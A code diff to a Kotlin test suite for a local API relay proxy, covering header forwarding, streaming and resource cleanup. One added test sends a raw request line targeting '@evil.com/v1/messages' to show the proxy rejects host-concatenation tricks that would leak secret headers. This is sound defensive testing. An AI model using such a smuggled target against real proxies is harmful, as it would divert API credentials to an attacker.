@@ -32,6 +32,49 @@ import kotlinx.coroutines.withTimeout
 import kotlinx.io.readString
 
 class RelayTest {
+    // engine-owned; a Ktor bump that adds a name fails here
+    private val engineOwnedRequestHeaders =
+        setOf("host", "content-length", "content-type", "user-agent")
+
+    @Test
+    fun `the upstream sees exactly the client's headers minus what is stripped, plus what the client engine owns`() =
+        runBlocking {
+            FakeUpstream().use { upstream ->
+                ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
+                    val sent =
+                        mapOf(
+                            "authorization" to "Bearer token",
+                            "anthropic-version" to "2023-06-01",
+                            "accept-encoding" to "gzip",
+                            "connection" to "keep-alive",
+                            "x-test-custom" to "value",
+                            "accept" to "*/*",
+                        )
+                    HttpClient(CIO).use { client ->
+                        client.post("${proxy.url}/v1/messages") {
+                            sent.forEach { (name, value) -> header(name, value) }
+                            contentType(ContentType.Application.Json)
+                            setBody("{}")
+                        }
+                    }
+
+                    val notForwarded =
+                        setOf(
+                            // hop-by-hop
+                            "connection",
+                            // stripped so responses are never compressed
+                            "accept-encoding",
+                        )
+                    val expected =
+                        (sent.keys - notForwarded).map { it.lowercase() }.toSet() +
+                            engineOwnedRequestHeaders
+                    val seen =
+                        upstream.received.single().headers.keys.map { it.lowercase() }.toSet()
+                    assertEquals(expected, seen)
+                }
+            }
+        }
+
     @Test
     fun `relays a messages request to the upstream and returns its response unchanged`() =
         runBlocking {
@@ -41,9 +84,11 @@ class RelayTest {
                 }
                 ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
                     val response =
-                        HttpClient(CIO).post("${proxy.url}/v1/messages") {
-                            contentType(ContentType.Application.Json)
-                            setBody("""{"model":"claude","messages":[]}""")
+                        HttpClient(CIO).use {
+                            it.post("${proxy.url}/v1/messages") {
+                                contentType(ContentType.Application.Json)
+                                setBody("""{"model":"claude","messages":[]}""")
+                            }
                         }
 
                     assertEquals(200, response.status.value)
@@ -78,12 +123,14 @@ class RelayTest {
                 }
                 ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
                     val response =
-                        HttpClient(CIO).post("${proxy.url}/v1/messages") {
-                            header("anthropic-beta", "oauth-2025-04-20")
-                            header("x-api-key", "sk-ant-test")
-                            header("authorization", "Bearer token")
-                            header("accept-encoding", "gzip")
-                            setBody("{}")
+                        HttpClient(CIO).use {
+                            it.post("${proxy.url}/v1/messages") {
+                                header("anthropic-beta", "oauth-2025-04-20")
+                                header("x-api-key", "sk-ant-test")
+                                header("authorization", "Bearer token")
+                                header("accept-encoding", "gzip")
+                                setBody("{}")
+                            }
                         }
 
                     val seen = upstream.received.single().headers.mapKeys { it.key.lowercase() }
@@ -124,21 +171,23 @@ class RelayTest {
                     )
                 }
                 ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
-                    HttpClient(CIO)
-                        .preparePost("${proxy.url}/v1/messages") { setBody("{}") }
-                        .execute { response ->
-                            val channel = response.bodyAsChannel()
-                            // The last frame is held back, so this line can only arrive if the
-                            // first was relayed alone.
-                            val firstLine = withTimeout(5_000) { channel.readLine() }
-                            assertEquals("event: message_start", firstLine)
+                    HttpClient(CIO).use { client ->
+                        client
+                            .preparePost("${proxy.url}/v1/messages") { setBody("{}") }
+                            .execute { response ->
+                                val channel = response.bodyAsChannel()
+                                // The last frame is held back, so this line can only arrive if the
+                                // first was relayed alone.
+                                val firstLine = withTimeout(5_000) { channel.readLine() }
+                                assertEquals("event: message_start", firstLine)
 
-                            releaseLast.complete(Unit)
-                            assertEquals(
-                                first.removePrefix("event: message_start\n") + last,
-                                channel.readRemaining().readString(),
-                            )
-                        }
+                                releaseLast.complete(Unit)
+                                assertEquals(
+                                    first.removePrefix("event: message_start\n") + last,
+                                    channel.readRemaining().readString(),
+                                )
+                            }
+                    }
                 }
             }
         }
@@ -194,25 +243,53 @@ class RelayTest {
         }
 
     @Test
+    fun `refuses a request target that does not start with a slash with a plain 400`() =
+        runBlocking {
+            FakeUpstream().use { upstream ->
+                ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
+                    // A local process could otherwise redirect the secret headers to another
+                    // host by concatenation; speak raw HTTP/1.1 since no client library builds a
+                    // request line like this.
+                    val (host, port) = proxy.url.removePrefix("http://").split(":")
+                    val response =
+                        Socket(host, port.toInt()).use { socket ->
+                            socket
+                                .getOutputStream()
+                                .write(
+                                    "POST @evil.com/v1/messages HTTP/1.1\r\nHost: $host:$port\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+                                        .toByteArray()
+                                )
+                            socket.getInputStream().bufferedReader().readText()
+                        }
+
+                    // The refusal's own words prove the guard answered; an unguarded relay would
+                    // send the request to evil.com, so the fake upstream cannot witness it.
+                    assertTrue(response.startsWith("HTTP/1.1 400 Bad Request"), response)
+                    assertContains(response, "request target must start with /")
+                }
+            }
+        }
+
+    @Test
     fun `answers the hello probe locally and passes token counting and model listing through`() =
         runBlocking {
             FakeUpstream().use { upstream ->
                 ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
-                    val client = HttpClient(CIO)
+                    HttpClient(CIO).use { client ->
+                        assertEquals(200, client.head("${proxy.url}/api/hello").status.value)
+                        assertTrue(
+                            upstream.received.isEmpty(),
+                            "the hello probe is answered by the proxy itself",
+                        )
 
-                    assertEquals(200, client.head("${proxy.url}/api/hello").status.value)
-                    assertTrue(
-                        upstream.received.isEmpty(),
-                        "the hello probe is answered by the proxy itself",
-                    )
+                        client.post("${proxy.url}/v1/messages/count_tokens") { setBody("{}") }
+                        client.get("${proxy.url}/v1/models?limit=1000")
 
-                    client.post("${proxy.url}/v1/messages/count_tokens") { setBody("{}") }
-                    client.get("${proxy.url}/v1/models?limit=1000")
-
-                    assertEquals(
-                        listOf("POST /v1/messages/count_tokens", "GET /v1/models?limit=1000"),
-                        upstream.received.map { "${it.method} ${it.uri}" },
-                    )
+                        assertEquals(
+                            listOf("POST /v1/messages/count_tokens", "GET /v1/models?limit=1000"),
+                            upstream.received.map { "${it.method} ${it.uri}" },
+                        )
+                    }
                 }
             }
         }
@@ -223,10 +300,12 @@ class RelayTest {
         val marker = "probe-" + UUID.randomUUID()
         FakeUpstream().use { upstream ->
             ProxyServer(ProxyConfig(port = 0, anthropicUpstream = upstream.url)).use { proxy ->
-                HttpClient(CIO).post("${proxy.url}/v1/$marker") {
-                    header("x-api-key", "sk-ant-SECRET-KEY")
-                    header("authorization", "Bearer SECRET-TOKEN")
-                    setBody("{}")
+                HttpClient(CIO).use {
+                    it.post("${proxy.url}/v1/$marker") {
+                        header("x-api-key", "sk-ant-SECRET-KEY")
+                        header("authorization", "Bearer SECRET-TOKEN")
+                        setBody("{}")
+                    }
                 }
             }
         }
@@ -261,28 +340,29 @@ class RelayTest {
                         ProxyConfig(port = 0, anthropicUpstream = upstream.url, dumpFrames = dump)
                     )
                     .use { proxy ->
-                        val client = HttpClient(CIO)
-                        // Two responses stream at once; their first frames are on the wire before
-                        // either second frame.
-                        val a = async {
-                            client
-                                .post("${proxy.url}/v1/a") {
-                                    header("x-api-key", "sk-ant-SECRET")
-                                    setBody("{}")
-                                }
-                                .bodyAsText()
-                        }
-                        val b = async {
-                            client.post("${proxy.url}/v1/b") { setBody("{}") }.bodyAsText()
-                        }
-                        withTimeout(5_000) { while (upstream.received.size < 2) delay(20) }
-                        releaseSecondFrames.complete(Unit)
-                        a.await()
-                        b.await()
+                        HttpClient(CIO).use { client ->
+                            // Two responses stream at once; their first frames are on the wire
+                            // before either second frame.
+                            val a = async {
+                                client
+                                    .post("${proxy.url}/v1/a") {
+                                        header("x-api-key", "sk-ant-SECRET")
+                                        setBody("{}")
+                                    }
+                                    .bodyAsText()
+                            }
+                            val b = async {
+                                client.post("${proxy.url}/v1/b") { setBody("{}") }.bodyAsText()
+                            }
+                            withTimeout(5_000) { while (upstream.received.size < 2) delay(20) }
+                            releaseSecondFrames.complete(Unit)
+                            a.await()
+                            b.await()
 
-                        // And one non-streaming response.
-                        upstream.reply = { FakeUpstream.Reply(body = """{"type":"message"}""") }
-                        client.post("${proxy.url}/v1/messages") { setBody("{}") }.bodyAsText()
+                            // And one non-streaming response.
+                            upstream.reply = { FakeUpstream.Reply(body = """{"type":"message"}""") }
+                            client.post("${proxy.url}/v1/messages") { setBody("{}") }.bodyAsText()
+                        }
                     }
             }
 
